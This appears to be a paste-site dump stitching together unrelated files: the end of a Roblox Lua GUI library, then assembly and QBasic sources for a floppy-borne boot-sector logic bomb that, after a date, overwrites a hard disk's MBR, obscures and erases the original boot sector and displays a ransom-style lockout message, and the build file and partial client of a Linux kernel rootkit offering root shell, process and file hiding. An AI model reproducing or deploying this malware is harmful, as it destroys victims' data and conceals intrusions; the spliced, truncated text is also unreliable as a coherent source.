		Slider.Position = UDim2.new(0, 13, 0, listOffset[winCount])
		Slider.Size = UDim2.new(0, 180, 0, 6)
		Slider.ZIndex = 2 + zindex
		Slider.InputBegan:Connect(SliderMovement)
		Slider.InputEnded:Connect(SliderEnd)

		SliderButton.Position = UDim2.new(0, (Slider.Size.X.Offset - 5) * ((default - min)/(max-min)), -1.333337, 0)
		SliderButton.Name = ""SliderButton""
		SliderButton.Parent = Slider
		SliderButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		SliderButton.BorderColor3 = Color3.fromRGB(100, 0, 190)
		SliderButton.Size = UDim2.new(0, 6, 0, 22)
		SliderButton.ZIndex = 3 + zindex
		SliderButton.InputBegan:Connect(SliderMovement)
		SliderButton.InputEnded:Connect(SliderEnd)	

		Current.Name = ""Current""
		Current.Parent = SliderButton
		Current.BackgroundTransparency = 1.000
		Current.Position = UDim2.new(0, 3, 0, 22)
		Current.Size = UDim2.new(0, 0, 0, 18)
		Current.Font = Enum.Font.SourceSans
		Current.Text = tostring(default)
		Current.TextColor3 = Color3.fromRGB(255, 255, 255)
		Current.TextSize = 14.000
		Current.ZIndex = 2 + zindex

		Description.Name = ""Description""
		Description.Parent = Slider
		Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Description.BackgroundTransparency = 1.000
		Description.Position = UDim2.new(0, -10, 0, -35)
		Description.Size = UDim2.new(0, 200, 0, 21)
		Description.Font = Enum.Font.SourceSans
		Description.Text = text
		Description.TextColor3 = Color3.fromRGB(255, 255, 255)
		Description.TextSize = 16.000
		Description.ZIndex = 2 + zindex

		SilderFiller.Name = ""SilderFiller""
		SilderFiller.Parent = Slider
		SilderFiller.BackgroundColor3 = Color3.fromRGB(100, 0, 190)
		SilderFiller.BorderColor3 = Color3.fromRGB(0, 0, 0)
		SilderFiller.Size = UDim2.new(0, (Slider.Size.X.Offset - 5) * ((default - min)/(max-min)), 0, 6)
		SilderFiller.ZIndex = 2 + zindex
		SilderFiller.BorderMode = Enum.BorderMode.Inset

		Min.Name = ""Min""
		Min.Parent = Slider
		Min.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Min.BackgroundTransparency = 1.000
		Min.Position = UDim2.new(-0.00555555569, 0, -7.33333397, 0)
		Min.Size = UDim2.new(0, 77, 0, 50)
		Min.Font = Enum.Font.SourceSans
		Min.Text = tostring(min)
		Min.TextColor3 = Color3.fromRGB(255, 255, 255)
		Min.TextSize = 14.000
		Min.TextXAlignment = Enum.TextXAlignment.Left
		Min.ZIndex = 2 + zindex

		Max.Name = ""Max""
		Max.Parent = Slider
		Max.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Max.BackgroundTransparency = 1.000
		Max.Position = UDim2.new(0.577777743, 0, -7.33333397, 0)
		Max.Size = UDim2.new(0, 77, 0, 50)
		Max.Font = Enum.Font.SourceSans
		Max.Text = tostring(max)
		Max.TextColor3 = Color3.fromRGB(255, 255, 255)
		Max.TextSize = 14.000
		Max.TextXAlignment = Enum.TextXAlignment.Right
		Max.ZIndex = 2 + zindex
		pastSliders[winCount] = true

		local slider = {}
		function slider:SetValue(value)
		value = math.clamp(value, min, max)
			local xOffset = (value-min)/max * (Slider.Size.X.Offset)
			SliderButton.Position = UDim2.new(0, xOffset , -1.33333337, 0)
			SilderFiller.Size = UDim2.new(0, xOffset, 0, 6)
			Current.Text = tostring(math.round(value))
		end
		return slider
	end
	function functions:Dropdown(text, buttons, callback, selective)
		local text = text or ""Dropdown""
		local buttons = buttons or {}
		local callback = callback or function() end

		local Dropdown = Instance.new(""TextButton"")
		local DownSign = Instance.new(""TextLabel"")
		local DropdownFrame = Instance.new(""ScrollingFrame"")

		sizes[winCount] = sizes[winCount] + 32
		Window.Size = UDim2.new(0, 207, 0, sizes[winCount] + 10)

		listOffset[winCount] = listOffset[winCount] + 32

		Dropdown.Name = ""Dropdown""
		Dropdown.Parent = Window
		Dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Dropdown.BorderColor3 = Color3.fromRGB(100, 0, 190)
		Dropdown.Position = UDim2.new(0, 12, 0, listOffset[winCount])
		Dropdown.Size = UDim2.new(0, 182, 0, 26)
		Dropdown.Selected = true
		Dropdown.Font = Enum.Font.SourceSans
		Dropdown.Text = tostring(text)
		Dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
		Dropdown.TextSize = 16.000
		Dropdown.TextStrokeTransparency = 123.000
		Dropdown.TextWrapped = true
		Dropdown.ZIndex = 3 + zindex
		Dropdown.MouseButton1Up:Connect(function()
			for i, v in pairs(dropdowns) do
				if v ~= DropdownFrame then
				v.Visible = false
				DownSign.Rotation = 0
				end
			end
			if DropdownFrame.Visible then
				DownSign.Rotation = 0
			else
				DownSign.Rotation = 180
			end
			DropdownFrame.Visible = not DropdownFrame.Visible
		end)

		DownSign.Name = ""DownSign""
		DownSign.Parent = Dropdown
		DownSign.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DownSign.BackgroundTransparency = 1.000
		DownSign.Position = UDim2.new(0, 155, 0, 2)
		DownSign.Size = UDim2.new(0, 27, 0, 22)
		DownSign.Font = Enum.Font.SourceSans
		DownSign.Text = ""^""
		DownSign.TextColor3 = Color3.fromRGB(255, 255, 255)
		DownSign.TextSize = 20.000
		DownSign.ZIndex = 4 + zindex
		DownSign.TextYAlignment = Enum.TextYAlignment.Bottom

		DropdownFrame.Name = ""DropdownFrame""
		DropdownFrame.Parent = Dropdown
		DropdownFrame.Active = true
		DropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		DropdownFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		DropdownFrame.Position = UDim2.new(0, 0, 0, 28)
		DropdownFrame.Size = UDim2.new(0, 182, 0, 0)
		DropdownFrame.Visible = false
		DropdownFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
		DropdownFrame.ScrollBarThickness = 4
		DropdownFrame.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
		DropdownFrame.ZIndex = 5 + zindex
		DropdownFrame.ScrollingDirection = Enum.ScrollingDirection.Y
		DropdownFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
		table.insert(dropdowns, DropdownFrame)
		local dropFunctions = {}
		local canvasSize = 0
		function dropFunctions:Button(name)
			local name = name or """"
			local Button_2 = Instance.new(""TextButton"")
			Button_2.Name = ""Button""
			Button_2.Parent = DropdownFrame
			Button_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Button_2.BorderColor3 = Color3.fromRGB(100, 0, 190)
			Button_2.Position = UDim2.new(0, 6, 0, canvasSize + 1)
			Button_2.Size = UDim2.new(0, 170, 0, 26)
			Button_2.Selected = true
			Button_2.Font = Enum.Font.SourceSans
			Button_2.TextColor3 = Color3.fromRGB(255, 255, 255)
			Button_2.TextSize = 16.000
			Button_2.TextStrokeTransparency = 123.000
			Button_2.ZIndex = 6 + zindex
			Button_2.Text = name
			Button_2.TextWrapped = true
			canvasSize = canvasSize + 27
			DropdownFrame.CanvasSize = UDim2.new(0, 182, 0, canvasSize + 1)
			if #DropdownFrame:GetChildren() < 8 then
			DropdownFrame.Size = UDim2.new(0, 182, 0, DropdownFrame.Size.Y.Offset + 27)
			end
			Button_2.MouseButton1Up:Connect(function()
				callback(name)
		DropdownFrame.Visible = false
		if selective then
			Dropdown.Text = name
		end
			end)
		end
		function dropFunctions:Remove(name)
			local foundIt
			for i, v in pairs(DropdownFrame:GetChildren()) do
				if foundIt then
					canvasSize = canvasSize - 27
					v.Position = UDim2.new(0, 6, 0, v.Position.Y.Offset - 27)
					DropdownFrame.CanvasSize = UDim2.new(0, 182, 0, canvasSize + 1)
				end
				if v.Text == name then
					foundIt = true
					v:Destroy()
					if #DropdownFrame:GetChildren() < 8 then
						DropdownFrame.Size = UDim2.new(0, 182, 0, DropdownFrame.Size.Y.Offset - 27)
					end
				end
			end
			if not foundIt then
				warn(""The button you tried to remove didn't exist!"")
			end
		end

		for i, v in pairs(buttons) do
			dropFunctions:Button(v)
		end

		return dropFunctions
	end
	function functions:ColorPicker(name, default, callback)
		local callback = callback or function() end

		local ColorPicker = Instance.new(""TextButton"")
		local PickerCorner = Instance.new(""UICorner"")
		local PickerDescription = Instance.new(""TextLabel"")
		local ColorPickerFrame = Instance.new(""Frame"")
		local ToggleRGB = Instance.new(""TextButton"")
		local ToggleFiller_2 = Instance.new(""Frame"")
		local TextLabel = Instance.new(""TextLabel"")
		local ClosePicker = Instance.new(""TextButton"")
		local Canvas = Instance.new(""Frame"")
		local CanvasGradient = Instance.new(""UIGradient"")
		local Cursor = Instance.new(""ImageLabel"")
		local Color = Instance.new(""Frame"")
		local ColorGradient = Instance.new(""UIGradient"")
		local ColorSlider = Instance.new(""Frame"")
		local Title = Instance.new(""TextLabel"")
		local UICorner = Instance.new(""UICorner"")
		local ColorCorner = Instance.new(""UICorner"")
		local BlackOverlay = Instance.new(""ImageLabel"")

		sizes[winCount] = sizes[winCount] + 32
		Window.Size = UDim2.new(0, 207, 0, sizes[winCount] + 10)

		listOffset[winCount] = listOffset[winCount] + 32

		ColorPicker.Name = ""ColorPicker""
		ColorPicker.Parent = Window
		ColorPicker.Position = UDim2.new(0, 137, 0, listOffset[winCount])
		ColorPicker.Size = UDim2.new(0, 57, 0, 26)
		ColorPicker.Font = Enum.Font.SourceSans
		ColorPicker.Text = """"
		ColorPicker.TextColor3 = Color3.fromRGB(0, 0, 0)
		ColorPicker.TextSize = 14.000
		ColorPicker.ZIndex = 2 + zindex
		ColorPicker.MouseButton1Up:Connect(function()
			for i, v in pairs(colorPickers) do
				v.Visible = false
			end
			ColorPickerFrame.Visible = not ColorPickerFrame.Visible
		end)

		PickerCorner.Parent = ColorPicker
		PickerCorner.Name = ""PickerCorner""
		PickerCorner.CornerRadius = UDim.new(0, 2)

		PickerDescription.Name = ""PickerDescription""
		PickerDescription.Parent = ColorPicker
		PickerDescription.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		PickerDescription.BackgroundTransparency = 1.000
		PickerDescription.Position = UDim2.new(-2.15789509, 0, 0, 0)
		PickerDescription.Size = UDim2.new(0, 116, 0, 26)
		PickerDescription.Font = Enum.Font.SourceSans
		PickerDescription.Text = name or ""Color picker""
		PickerDescription.TextColor3 = Color3.fromRGB(255, 255, 255)
		PickerDescription.TextSize = 16.000
		PickerDescription.TextXAlignment = Enum.TextXAlignment.Left
		PickerDescription.ZIndex = 2 + zindex

		ColorPickerFrame.Name = ""ColorPickerFrame""
		ColorPickerFrame.Parent = ColorPicker
		ColorPickerFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ColorPickerFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ColorPickerFrame.Position = UDim2.new(1.40350854, 0, -2.84615374, 0)
		ColorPickerFrame.Size = UDim2.new(0, 158, 0, 155)
		ColorPickerFrame.ZIndex = 3 + zindex
		ColorPickerFrame.Visible = false

		ToggleRGB.Name = ""ToggleRGB""
		ToggleRGB.Parent = ColorPickerFrame
		ToggleRGB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ToggleRGB.BorderColor3 = Color3.fromRGB(100, 0, 190)
		ToggleRGB.Position = UDim2.new(0, 125, 0, 127)
		ToggleRGB.Size = UDim2.new(0, 22, 0, 22)
		ToggleRGB.Font = Enum.Font.SourceSans
		ToggleRGB.Text = """"
		ToggleRGB.TextColor3 = Color3.fromRGB(0, 0, 0)
		ToggleRGB.TextSize = 14.000
		ToggleRGB.ZIndex = 4 + zindex

		ToggleFiller_2.Name = ""ToggleFiller""
		ToggleFiller_2.Parent = ToggleRGB
		ToggleFiller_2.BackgroundColor3 = Color3.fromRGB(100, 0, 190)
		ToggleFiller_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ToggleFiller_2.Position = UDim2.new(0, 5, 0, 5)
		ToggleFiller_2.Size = UDim2.new(0, 12, 0, 12)
		ToggleFiller_2.ZIndex = 4 + zindex
		ToggleFiller_2.Visible = false

		TextLabel.Parent = ToggleRGB
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(-5.13636351, 0, 0, 0)
		TextLabel.Size = UDim2.new(0, 106, 0, 22)
		TextLabel.Font = Enum.Font.SourceSans
		TextLabel.Text = ""Rainbow""
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 16.000
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left
		TextLabel.ZIndex = 4 + zindex

		ClosePicker.Name = ""ClosePicker""
		ClosePicker.Parent = ColorPickerFrame
		ClosePicker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ClosePicker.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ClosePicker.Position = UDim2.new(0, 132, 0, 5)
		ClosePicker.Size = UDim2.new(0, 21, 0, 21)
		ClosePicker.Font = Enum.Font.SourceSans
		ClosePicker.Text = ""X""
		ClosePicker.TextColor3 = Color3.fromRGB(255, 255, 255)
		ClosePicker.TextSize = 18.000
		ClosePicker.ZIndex = 4 + zindex
		ClosePicker.MouseButton1Down:Connect(function()
			ColorPickerFrame.Visible = not ColorPickerFrame.Visible
		end)

		CanvasGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
		CanvasGradient.Name = ""CanvasGradient""
		CanvasGradient.Parent = Canvas

		BlackOverlay.Name = ""BlackOverlay""
		BlackOverlay.Parent = Canvas
		BlackOverlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		BlackOverlay.BackgroundTransparency = 1.000
		BlackOverlay.Size = UDim2.new(1, 0, 1, 0)
		BlackOverlay.Image = ""rbxassetid://5107152095""
		BlackOverlay.ZIndex = 5 + zindex

		UICorner.Parent = Canvas
		UICorner.Name = ""UICorner""
		UICorner.CornerRadius = UDim.new(0, 2)

		Cursor.Name = ""Cursor""
		Cursor.Parent = Canvas
		Cursor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Cursor.BackgroundTransparency = 1.000
		Cursor.Size = UDim2.new(0, 8, 0, 8)
		Cursor.Image = ""rbxassetid://5100115962""
		Cursor.ZIndex = 5 + zindex

		local draggingColor = false
		local hue = 0
		local sat = 1
		local brightness = 1
		
		local con

		ToggleRGB.MouseButton1Down:Connect(function()
			ToggleFiller_2.Visible = not ToggleFiller_2.Visible
			if ToggleFiller_2.Visible then
				con = stepped:Connect(function()
					if ToggleFiller_2.Visible then
						local hue2 = tick() % 5 / 5
						color3 = Color3.fromHSV(hue2, 1, 1)
						callback(color3, true)
						ColorPicker.BackgroundColor3 = color3
					else
						con:Disconnect()
					end
				end)
			end
		end)
		
		if default and type(default) == ""boolean"" then
			ToggleFiller_2.Visible = true
			if ToggleFiller_2.Visible then
				con = stepped:Connect(function()
					if ToggleFiller_2.Visible then
						local hue2 = tick() % 5 / 5
						color3 = Color3.fromHSV(hue2, 1, 1)
						callback(color3)
						ColorPicker.BackgroundColor3 = color3
					else
						con:Disconnect()
					end
				end)
			end
		else
			ColorPicker.BackgroundColor3 = default or Color3.fromRGB(100, 0, 190)
		end

		Canvas.Name = ""Canvas""
		Canvas.Parent = ColorPickerFrame
		Canvas.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Canvas.Position = UDim2.new(0, 5, 0, 34)
		Canvas.Size = UDim2.new(0, 148, 0, 64)
		Canvas.ZIndex = 4 + zindex
		local canvasSize, canvasPosition = Canvas.AbsoluteSize, Canvas.AbsolutePosition
		Canvas.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				local initial = Vector2.new(Cursor.Position.X.Offset, Cursor.Position.Y.Offset)
				local delta = Cursor.AbsolutePosition - initial
				local con
				local isdragging = true

				con = stepped:Connect(function()
					if isdragging then
						local delta2 = Vector2.new(mouse.X, mouse.Y) - delta
						local x = math.clamp(delta2.X, 2, Canvas.Size.X.Offset - 2)
						local y = math.clamp(delta2.Y, 2, Canvas.Size.Y.Offset - 2)
						
						sat = 1 - math.clamp((mouse.X - canvasPosition.X) / canvasSize.X, 0, 1)
						brightness = 1 - math.clamp((mouse.Y - canvasPosition.Y) / canvasSize.Y, 0, 1)
				
						color3 = Color3.fromHSV(hue, sat, brightness)
						
						Cursor.Position = UDim2.fromOffset(x - 4, y - 4)
						ColorPicker.BackgroundColor3 = color3
						callback(color3)
					else
						con:Disconnect()
					end
				end)
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						isdragging = false
					end
				end)
			end
		end)

		Color.Name = ""Color""
		Color.Parent = ColorPickerFrame
		Color.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Color.Position = UDim2.new(0, 5, 0, 105)
		Color.Size = UDim2.new(0, 148, 0, 14)
		Color.BorderMode = Enum.BorderMode.Inset
		Color.ZIndex = 4 + zindex
		Color.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				draggingColor = true
				local initial2 = ColorSlider.Position.X.Offset
				local delta1 = ColorSlider.AbsolutePosition.X - initial2
				local con
				con = stepped:Connect(function()
				if draggingColor then
					local colorPosition, colorSize = Color.AbsolutePosition, Color.AbsoluteSize
					hue = 1 - math.clamp(1 - ((mouse.X - colorPosition.X) / colorSize.X), 0, 1)
					CanvasGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromHSV(hue, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}

					local xOffset = math.clamp(mouse.X - delta1, 0, Color.Size.X.Offset - 3)
					ColorSlider.Position = UDim2.new(0, xOffset, 0, 0)

					color3 = Color3.fromHSV(hue, sat, brightness)
					ColorPicker.BackgroundColor3 = color3
					callback(color3)
				else
					con:Disconnect()
				end
			end)
			end
		end)
		Color.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			draggingColor = false
			end
		end)
		ColorGradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
			ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
			ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
			ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 255)),
			ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)),
			ColorSequenceKeypoint.new(0.82, Color3.fromRGB(255, 0, 255)),
			ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))
		})
		ColorGradient.Name = ""ColorGradient""
		ColorGradient.Parent = Color

		ColorCorner.Parent = Color
		ColorCorner.Name = ""ColorCorner""
		ColorCorner.CornerRadius = UDim.new(0, 2)

		ColorSlider.Name = ""ColorSlider""
		ColorSlider.Parent = Color
		ColorSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ColorSlider.BorderColor3 = Color3.fromRGB(255, 255, 255)
		ColorSlider.Size = UDim2.new(0, 2, 0, 14)
		ColorSlider.ZIndex = 5 + zindex

		Title.Name = ""Title""
		Title.Parent = ColorPickerFrame
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0, 10, 0, 5)
		Title.Size = UDim2.new(0, 118, 0, 21)
		Title.Font = Enum.Font.SourceSans
		Title.Text = name or ""Color picker""
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextSize = 16.000
		Title.TextXAlignment = Enum.TextXAlignment.Left
		Title.ZIndex = 4 + zindex

		table.insert(colorPickers, ColorPickerFrame)

		local colorFuncs = {}
		function colorFuncs:UpdateColorPicker(color)
		if type(color) == ""userdata"" then
			ToggleFiller_2.Visible = false
			ColorPicker.BackgroundColor3 = color
		elseif color and type(color) == ""boolean"" and not con then
			ToggleFiller_2.Visible = true
				con = stepped:Connect(function()
					if ToggleFiller_2.Visible then
						local hue2 = tick() % 5 / 5
						color3 = Color3.fromHSV(hue2, 1, 1)
						callback(color3)
						ColorPicker.BackgroundColor3 = color3
					else
						con:Disconnect()
					end
				end)
			end
		end
	return colorFuncs
	end

	return functions
end

return library"
1490SJ36,README,FlyFar,Email,Sunday 24th of December 2023 02:23:20 AM CDT,"By Jethro82 on Github
I wrote this code in 2013 just to see if it could be done. At the time there were a lot more legacy booting devices that checked for a bootable optical disk first. In case you're wondering: I created one disk, put it IN MY MACHINE on startup, advanced the date reversed the process, and then physically destroyed that disk. This code was never used maliciously."
xZh76Rjv,DateChck.ASM,FlyFar,ASM (NASM),Sunday 24th of December 2023 02:19:07 AM CDT,"call GetAddress
GetAddress: 

pop bx ; set bx to current location
sub bx,5 ;set bx to 2 bytes before call command
mov ds,cs ;set DS to Code Sector
mov [bx],13CDh ;write Int 13h to immediately before code in thus file
push bx ;set return point to two bytes before code in this file
add bx,2 ;set bx to beginning of this file


mov ah, 4
int 1ah ;check BCD date


mov ax,201h
mov es,cs
mov dx,80h    ;set es, ax, dx(bx) for int 13 sector read

cmp cx,2015h 
jge sector3load ;if on or after 2015 load sector  
        mov cx,2
        ret ;load and run sector 2 if before 2015
sector3load:
mov cx,3
ret ;load sector 3 if on or after 2015"
BbhEjy2u,DskWrite.BAS,FlyFar,QBasic,Sunday 24th of December 2023 02:18:30 AM CDT,"DECLARE SUB WriteSector(index%, filename$)
TYPE Sector
        MachineCode AS STRING * 510
        signature AS INTEGER
END TYPE
DIM SHARED Sector AS Sector
Sector.signature = &HAA55 ;add boot signature to end of sector
OPEN ""floppy.img"" FOR RANDOM AS #1 LEN = 512
WriteSector 1, ""floppybs""
WriteSector 2, ""datechck""
WriteSector 4, ""payload""
Sector.MachineCode = """"
PUT #1, 2880, Sector ;set size of file to exactly 1440KiB
Close #1

SUB WriteSector (SecNo%, filename$)
	OPEN filename$ + "".COM"" FOR RANDOM AS #2 LEN = 510
	GET #2, 1, Sector.MachineCode
	PUT #1, SecNo%, Sector
	CLOSE #2
END SUB
"
48jCtG1f,FloppyBS.ASM,FlyFar,ASM (NASM),Sunday 24th of December 2023 02:17:56 AM CDT,"call GetAddr
GetAddr:
pop bx   ;set bx to GetAddr

mov ax, 203h 
mov dx,80h
mov cx,1
add bx,509
mov es,cs
int 13h ;     load first 3 sectors of HD to 512 bytes after the beginning of this code

mov ds,cs 
cmp [bx+1022],0AA55h 
jnz SuperWrite ;check 2nd sector of HD for boot signature if not continue to logic bomb install
        sub bx,514 ;set bx to 2 bytes before this code
        mov [bx],13cdh ;write Int 13h to bx location
        push bx ;add bx to stack
        add bx,2
        mov ax,201h
        inc cx
ret ;load HD sector 2 as boot code and run it
 
SuperWrite:
mov dx,0
inc cx
mov ax,203h
int 13h ;load sectors 2, 3 and 4 of disk image to 512 bytes after this code starts

mov dx,80h
mov ax,201h
mov cx,1
add bx,512
int 13h ;move sector 1 of HD to 1024 bytes after this code starts

mov dx,bx 
add dx,512 ;set dx to boot signature on original HD boot sector
add bx,446 ;set bx to start of MBR partition table
 
 MemoryShuntingLoop:
        mov cx,[bx]
        sub bx,512
        mov [bx],cx 
        add bx, 514 ;copy partition table 2 bytes at a time from sector 1 of HD to Sector 2 of Floppy
        cmp bx,dx
jnz MemoryShuntingLoop

sub bx,1024
mov ax,303h
mov cx,1
mov dx,80h
int 13h ;write out sector 1, 2, 3 of HD - Logic bomb's in sector 1 and 3, old MBR code in sector 2.


add bx,512 
mov dx,bx
add dx,512 ;set bx, dx to beginnning, end of old sector 1 of HD in ram.
xor1:
        xor [bx],0faceh
        add bx,2
        cmp bx,dx
jnz xor1 ;Xor old HD sector by 'face' in hex.

mov ax,301h
mov cx,7
mov dx,80h
sub bx,512
int 13h ;save encryped old hd to sector 7


sub bx,514 
mov [bx],13CD
push bx ;write Int 13 to before this code, set stack to jump to it on return

add bx,2
mov ax,201h
mov dx,80h
mov cx,2
ret ;read sector 2 of HD then execute code from boot location"
qm2nBK7U,Payload.asm,FlyFar,ASM (NASM),Sunday 24th of December 2023 02:17:14 AM CDT,"CALL EndMessage ;push beginning location of data block onto stack
StartMessage:
DB""Your Harddrive's partitions have been locked by order of:"",13,10
db""the Chaqueur of Wasst"",13,10
db""RSA(e, PQ): (3, 0x1CCD760221A623F127F5785BE110FD32994DC6E04D342A77E33BF49768F16789BBB6E59DA949513815DB5953985E31A6CFC30EFA35C7A51AEE78E05AA8A1971BDB844D87F73792DFA59BE5E89E9946A056316BEBCBF3C66A5370F0FC4829AA532935F7E5E91B30912DEFD1B300752027D2A24B1BCB658A3568E631E1F959A01B)"",13,10
db""7 to 1 you'll solve your problems, but deface things first."",7 ;message to be displayed by rest of code
EndMessage:
pop bx ;retrieve bx from stack

mov bp,bx ;set bp as start of message

sub bx,3 ;set bx to start of sector
mov es,cs
mov ax,301h
mov dx,80h
mov cx,1
int 13h ;write out this sector to boot sector of HD

mov ax,301h
inc cx
int 13h ;destroy unencryped backup of original boot sector

MOV AX,3
INT 10h ; cls

MOV BX,8Fh ;set display colour to bright white, blinking
MOV CX,EndMessage - StartMessage ; set CL to end of messaage
MOV DX,0; set location to top left

KeyPressed:
	MOV AX,1300h
	add bl,2
	and bl,8fh ;shift between colour 1 and 15 counting by 2s on a black background - always blinking.
	INT 10h ;display message

	MOV AH,0
	INT 16h ; pause until key pressed
jmp KeyPressed"
uSkgztXT,Makefile,FlyFar,Make,Sunday 24th of December 2023 01:56:04 AM CDT,".PHONY: all
obj-m := rootkit.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
all: rootkit client
rootkit:
	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)
client:
	gcc -o client client.c --std=gnu99 -Wall -Wextra -pedantic
clean:
	rm -rf *.o *.ko *.symvers *.mod.* *.order"
vqF99DFt,client.c,FlyFar,C,Sunday 24th of December 2023 01:50:50 AM CDT,"/*
 * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>

#include ""config.h""

void print_help(char **argv)
{
    printf(
        ""Usage: %s [OPTION]...\n""
        ""\n""
        ""Options:\n""
        ""  --root-shell            Grants you root shell access.\n""
        ""  --hide-pid=PID          Hides the specified PID.\n""
        ""  --unhide-pid=PID        Unhides the specified PID.\n""
        ""  --hide-file=FILENAME    Hides the specified FILENAME globally.\n""
        ""                          Must be a filename without any path.\n""
        ""  --unhide-file=FILENAME  Unhides the specified FILENAME.\n""
        ""  --hide                  Hides the rootkit LKM.\n""
        ""  --unhide                Unhides the rootkit LKM.\n""
        ""  --help                  Print this help message.\n""
        ""  --protect               Protects the rootkit from rmmod.\n""
        ""  --unprotect             Disables the rmmod protection.\n\n"", argv[0]);
}

void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
                                   int *unhide_pid, char **pid, int *hide_file,
                                   int *unhide_file, char **file, int *hide,
                                   int *unhide, int *protect, int *unprotect)
{
    if (argc < 2) {
        fprintf(stderr, ""Error: No arguments provided.\n\n"");
        print_help(argv);
        exit(1);
    }

    opterr = 0;

    static struct option long_options[] = {
        {""root-shell"",  no_argument,       0, 'a'},
        {""hide-pid"",    required_argument, 0, 'b'},
        {""unhide-pid"",  required_argument, 0, 'c'},
        {""hide-file"",   required_argument, 0, 'd'},
        {""unhide-file"", required_argument, 0, 'e'},
        {""hide"",        no_argument,       0, 'f'},
        {""unhide"",      no_argument,       0, 'g'},
        {""help"",        no_argument,       0, 'h'},
        {""protect"",     no_argument,       0, 'i'},
        {""unprotect"",   no_argument,       0, 'j'},
        {0,             0,                 0,  0 }
    };

    *root = 0;
    *hide_pid = 0;
    *unhide_pid = 0;
    *pid = NULL;
    *hide_file = 0;
    *unhide_file = 0;
    *file = NULL;
    *hide = 0;
    *unhide = 0;
    *protect = 0;
    *unprotect = 0;

    int opt;

    while ((opt = getopt_long(argc, argv, "":"", long_options, NULL)) != -1) {

        switch (opt) {

            case 'a':
                *root = 1;
                break;

            case 'b':
                *hide_pid = 1;
                *pid = optarg;
                break;

            case 'c':
                *unhide_pid = 1;
                *pid = optarg;
                break;

            case 'd':
                *hide_file = 1;
                *file = optarg;
                break;

            case 'e':
                *unhide_file = 1;
                *file = optarg;
                break;

            case 'f':
                *hide = 1;
                break;

            case 'g':
                *unhide = 1;
                break;

            case 'h':
                print_help(argv);
                exit(0);

            case 'i':
                *protect = 1;
                break;

            case 'j':
                *unprotect = 1;
                break;

            case '?':
                fprintf(stderr, ""Error: Unrecognized option %s\n\n"", argv[optind - 1]);
                print_help(argv);
                exit(1);

            case ':':
                fprintf(stderr, ""Error: No argument provided for option %s\n\n"", argv[optind - 1]);
                print_help(argv);
                exit(1);
        }
    }

    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide
            + *unhide + *protect + *unprotect) != 1) {
        fprintf(stderr, ""Error: Exactly one option should be specified\n\n"");
        print_help(argv);
